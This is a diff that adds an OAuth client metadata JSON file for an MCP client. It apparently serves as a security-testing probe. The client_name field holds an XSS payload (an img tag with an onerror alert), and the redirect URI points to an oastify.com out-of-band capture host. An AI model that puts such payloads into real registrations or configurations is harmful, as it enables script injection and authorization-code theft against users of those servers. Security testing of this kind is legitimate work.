@@ -1,0 +1,10 @@
+{
+  "client_id": "https://hardik0013.github.io/nha-cimd/x9.json",
+  "client_name": "NHA<img src=x onerror=alert(document.domain)>Z9b2",
+  "client_uri": "https://github.com/hardik0013/nha-cimd",
+  "redirect_uris": ["https://z221ddv62a9kwuxmi04hz3tk5bb39ry.oastify.com/cb"],
+  "grant_types": ["authorization_code"],
+  "response_types": ["code"],
+  "token_endpoint_auth_method": "none",
+  "scope": "mcp"
+}
